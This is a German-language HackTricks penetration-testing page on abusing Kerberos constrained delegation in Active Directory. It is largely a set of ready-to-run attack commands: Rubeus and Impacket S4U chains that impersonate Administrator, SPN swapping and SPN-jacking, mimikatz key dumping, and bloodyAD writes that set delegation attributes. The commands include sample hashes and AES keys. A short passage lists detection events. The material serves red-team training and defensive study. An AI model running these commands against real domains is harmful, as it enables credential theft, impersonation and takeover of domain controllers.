# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Damit kann ein Domänenadministrator einem Computer **erlauben**, sich gegenüber jedem **Dienst** eines Computers als **Benutzer oder Computer auszugeben**.

- **Service for User to self (_S4U2self_):** Jedes **Dienstkonto, das einen SPN besitzt**, kann normalerweise einen TGS für sich selbst im Namen eines beliebigen Benutzers erhalten. Wenn das Konto außerdem [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) in _userAccountControl_ besitzt, ist dieser TGS **weiterleitbar**, was den Protocol Transition für die **klassische Constrained Delegation** direkt nutzbar macht.
- **Service for User to Proxy(_S4U2proxy_):** Ein **Dienstkonto** kann im Namen eines Benutzers einen TGS für die in **msDS-AllowedToDelegateTo** aufgeführten SPNs erhalten. Das in S4U2Proxy verwendete Evidence-Ticket muss ein **weiterleitbares** Ticket für den delegierenden Dienst sein: entweder ein echtes, vom Opfer abgefangenes Client-to-Service-Ticket oder eines, das mit **S4U2Self + T2A4D** erzeugt wurde.

**Hinweis**: Wenn ein Benutzer in AD als „_Account is sensitive and cannot be delegated_“ markiert ist oder Mitglied von **Protected Users** ist, können Sie sich normalerweise **nicht als dieser Benutzer ausgeben** durch Constrained Delegation. In modernen Domänen sollten Sie bei Delegation-fähigen Konten **AES**-Material gegenüber Annahmen, die nur auf RC4 basieren, bevorzugen.

Das bedeutet, dass Sie sich bei einer **Kompromittierung des Hashes des Dienstes** als **Benutzer ausgeben** und in deren Namen **Zugriff** auf jeden **Dienst** auf den angegebenen Computern erhalten können (mögliche **privesc**).

Außerdem haben Sie **nicht nur Zugriff auf den Dienst, als den sich der Benutzer ausgeben kann, sondern auch auf jeden Dienst**, da der SPN (der angeforderte Dienstname) nicht geprüft wird (dieser Teil ist im Ticket nicht verschlüsselt/signiert). Wenn Sie daher Zugriff auf den **CIFS-Dienst** haben, können Sie beispielsweise mithilfe des `/altservice`-Flags in Rubeus auch auf den **HOST-Dienst** zugreifen. Dieselbe Schwachstelle beim Austauschen von SPNs wird von **Impacket getST -altservice** und anderen Tools ausgenutzt.

Außerdem ist **LDAP-Dienstzugriff auf einem DC** erforderlich, um einen **DCSync** auszunutzen.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Hinweis für Operatoren:** Vertraue bei der Überprüfung von **gMSA/sMSA** nicht allein auf **ADUC**- oder BloodHound-Screenshots. Bei diesen Konten wird der übliche Tab „Delegation“ häufig nicht angezeigt. Ermittle daher die rohen Attribute **`userAccountControl`** und **`msDS-AllowedToDelegateTo`** direkt.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-Transition vs. Kerberos-only Constrained Delegation

Wenn das kompromittierte Konto über **T2A4D** verfügt, kannst du die vollständige **`S4U2Self -> S4U2Proxy`**-Kette normalerweise nur mit dem Service-Key/TGT abschließen.<sup>[[2]](#references)</sup>

Wenn es nur über **`msDS-AllowedToDelegateTo`** verfügt (den klassischen Modus **"Use Kerberos only"**), kann die Delegation weiterhin missbrauchbar sein. Das Evidence-Ticket für S4U2Proxy muss jedoch ein **echtes forwardable User-to-Service-Ticket** für den delegierenden Service sein. In der Praxis bedeutet das, ein Victim-TGS aus **LSASS/ccache** zu stehlen oder abzugreifen und es in die zweite Phase einzuspeisen (`/tgs:` in Rubeus). Ein **non-forwardable** S4U2Self-Ticket ist für klassische Constrained Delegation **nicht** ausreichend. Wenn dies dein einziges Evidence-Ticket ist, prüfe stattdessen [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

### Hinweise zu Cross-domain Constrained Delegation (2025+)

Seit **Windows Server 2012/2012 R2** unterstützt der KDC **Constrained Delegation über Domains/Forests hinweg** durch S4U2Proxy-Erweiterungen. Moderne Builds (Windows Server 2016–2025) behalten dieses Verhalten bei und fügen zwei PAC-SIDs hinzu, um den Protocol-Transition zu signalisieren:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**), wenn der Benutzer sich normal authentifiziert hat.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**), wenn ein Service die Identität durch Protocol Transition bestätigt hat.

Erwarte `SERVICE_ASSERTED_IDENTITY` innerhalb des PAC, wenn Protocol Transition domainübergreifend verwendet wird. Dies bestätigt, dass der S4U2Proxy-Schritt erfolgreich war.<sup>[[1]](#references)</sup>

### Impacket / Linux-Tooling (altservice & full S4U)

Aktuelle Impacket-Versionen (0.11.x+) stellen dieselbe S4U-Kette und dasselbe SPN-Swapping wie Rubeus bereit:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Wenn du zuerst den User-ST fälschen möchtest (z. B. nur mit einem offline ermittelten Hash), kombiniere **ticketer.py** mit **getST.py** für S4U2Proxy. **tgssub.py** ist ebenfalls hilfreich, wenn du bereits über einen funktionierenden ccache verfügst und nur die Serviceklasse für denselben Host austauschen musst. Siehe das offene Impacket-Issue #1713 für aktuelle Besonderheiten (KRB_AP_ERR_MODIFIED, wenn der gefälschte ST nicht zum SPN-Schlüssel passt).<sup>[[2]](#references)</sup>

### SPN-jacking: Umleiten eines Ziels der constrained delegation

Die klassische constrained delegation autorisiert einen **SPN-String** in `msDS-AllowedToDelegateTo`, keine unveränderliche Ziel-SID. Während S4U2Proxy ermittelt der KDC das Konto, dem dieser SPN derzeit gehört, und verschlüsselt das Service-Ticket mit dem langfristigen Schlüssel dieses Kontos. Daher kann die Kontrolle über das delegierende Konto zusammen mit `WriteSPN` für ein anderes Service-/Computerkonto eine unveränderte Delegation-Beschränkung umleiten, ohne `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Es gibt zwei Varianten:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** Der erlaubte SPN ist verwaist, weil sein früherer Besitzer gelöscht oder umbenannt wurde oder der SPN entfernt wurde. Füge ihn direkt zum gewünschten Zielkonto hinzu.
- **Live SPN-jacking:** Der SPN gehört weiterhin einem Quellkonto. Die Validierung doppelter SPNs verhindert normalerweise das Schreiben auf das Ziel. Daher wird `WriteSPN` für beide Objekte benötigt: Entferne ihn aus der Quelle, füge ihn dem Ziel hinzu, beschaffe das Ticket und stelle die ursprüngliche Registrierung wieder her.

Der folgende abstrahierte Linux-Ablauf verschiebt einen erlaubten SPN, führt S4U als der kompromittierte delegierende Principal aus und schreibt den Dienstnamen des Tickets auf einen nützlichen Service auf dem neuen Ziel um.<sup>[[5]](#references)[[6]](#references)</sup>
```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
-impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
"$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```
`-altservice` ist das zweite, separate Primitive. Das S4U2Proxy-Ticket wurde für das Konto verschlüsselt, das nun `$DELEGATED_SPN` besitzt; da sich der Dienstname des Tickets (`sname`) außerhalb des verschlüsselten Ticketinhalts befindet, kann das Tool eine andere Serviceklasse bzw. einen anderen Hostnamen einsetzen, deren Dienst denselben Kontoschlüssel verwendet. SPN-jacking ändert zunächst, **welcher Kontoschlüssel** das Ticket schützt, während die Substitution der Serviceklasse ändert, **wo** dieses Ticket präsentiert wird.<sup>[[5]](#references)[[6]](#references)</sup>

Beim Live-Jacking sollten die beiden LDAP-Schreibvorgänge unmittelbar nach dem Abrufen des Tickets rückgängig gemacht werden, um den legitimen Dienst nicht zu beeinträchtigen. Suche auf DCs mit aktivierter Überwachung von Computerkonten nach dem Security-Ereignis **4742**, bei dem `servicePrincipalName` von einem Computer entfernt und kurz darauf einem anderen hinzugefügt wird, insbesondere wenn sich der SPN-Hostname von `dNSHostName` des Zielsystems unterscheidet. Korreliere dies mit dem Ereignis **4769**: S4U2Self präsentiert dasselbe Konto als Client und Service, während S4U2Proxy **Transited Services** befüllt.<sup>[[5]](#references)</sup>

### Delegation-Setup mit Low-Priv-Credentials automatisieren

Wenn du bereits **GenericAll/WriteDACL** für ein Computer- oder Servicekonto besitzt, kannst du die erforderlichen Attribute remote ohne RSAT mithilfe von **bloodyAD** (2024+) setzen:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Damit kannst du einen Constrained-Delegation-Pfad für privesc erstellen, sobald du diese Attribute schreiben kannst.

- Schritt 1: **TGT des erlaubten Dienstes erhalten**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Es gibt **andere Möglichkeiten, ein TGT-Ticket** oder **RC4** bzw. **AES256** zu erhalten, ohne auf dem Computer SYSTEM zu sein, beispielsweise Printer Bug und unconstrain delegation, NTLM relaying sowie der Missbrauch von Active Directory Certificate Service.
>
> **Mit diesem TGT-Ticket (oder Hash) allein kannst du diesen Angriff durchführen, ohne den gesamten Computer zu kompromittieren.**

- Schritt 2: **TGS für den Service erhalten, wobei der Benutzer impersoniert wird**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Weitere Informationen auf ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) und [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Übersicht über Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Missbrauch von Delegation mit Impacket (Teil 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: Eine offensive Übersicht über Kerberos (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir – SPN-jacking: Ein Sonderfall beim Missbrauch von WriteSPN](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf – HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
